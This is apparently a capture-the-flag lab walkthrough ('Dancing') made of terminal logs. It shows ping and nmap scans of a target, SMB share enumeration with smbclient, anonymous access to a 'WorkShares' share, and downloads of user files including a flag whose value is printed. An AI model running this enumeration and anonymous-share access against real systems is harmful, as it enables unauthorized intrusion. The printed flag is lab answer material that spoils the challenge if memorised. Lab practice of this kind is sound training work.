# Dancing

```
┌──(kali㉿kali)-[~/Downloads]
└─$ ping 10.129.165.78
PING 10.129.165.78 (10.129.165.78) 56(84) bytes of data.
64 bytes from 10.129.165.78: icmp_seq=1 ttl=127 time=27.8 ms
64 bytes from 10.129.165.78: icmp_seq=2 ttl=127 time=26.8 ms
64 bytes from 10.129.165.78: icmp_seq=3 ttl=127 time=26.9 ms
^C
--- 10.129.165.78 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2010ms
rtt min/avg/max/mdev = 26.847/27.166/27.787/0.438 ms
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC 10.129.165.78
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 18:18 EDT
Nmap scan report for 10.129.165.78
Host is up (0.024s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb2-time: 
|   date: 2024-09-08T02:18:43
|_  start_date: N/A
|_clock-skew: 4h00m18s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 15.08 seconds
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sU -sV -O -v -p 445 10.129.165.78
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 18:24 EDT
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 18:24
Scanning 10.129.165.78 [4 ports]
Completed Ping Scan at 18:24, 0.89s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:24
Completed Parallel DNS resolution of 1 host. at 18:24, 0.01s elapsed
Initiating UDP Scan at 18:24
Scanning 10.129.165.78 [1 port]
Completed UDP Scan at 18:24, 0.09s elapsed (1 total ports)
Initiating Service scan at 18:24
Initiating OS detection (try #1) against 10.129.165.78
Retrying OS detection (try #2) against 10.129.165.78
NSE: Script scanning 10.129.165.78.
Initiating NSE at 18:24
Completed NSE at 18:24, 0.00s elapsed
Initiating NSE at 18:24
Completed NSE at 18:24, 0.00s elapsed
Nmap scan report for 10.129.165.78
Host is up (0.18s latency).

PORT    STATE  SERVICE      VERSION
445/udp closed microsoft-ds
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.47 seconds
           Raw packets sent: 18 (2.176KB) | Rcvd: 14 (1.700KB)
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo smbclient -L 10.129.165.78 
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.165.78 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo smbclient \\\\10.129.165.78\\WorkShares
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

                5114111 blocks of size 4096. 1750462 blocks available
smb: \> cd Amy.J\
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 05:08:24 2021
  ..                                  D        0  Mon Mar 29 05:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021

                5114111 blocks of size 4096. 1750462 blocks available
smb: \Amy.J\> get worknotes.txt 
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \Amy.J\> cd ..
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

                5114111 blocks of size 4096. 1750462 blocks available
smb: \> cd James.P\
lsmb: \James.P\> ls
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021

                5114111 blocks of size 4096. 1750462 blocks available
smb: \James.P\> get flag.txt 
getting file \James.P\flag.txt of size 32 as flag.txt (0.3 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \James.P\> bye
bye: command not found
smb: \James.P\> ^C
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ cat flag.txt 
5f61c10dffbc77a704d76016a22f1664  
```
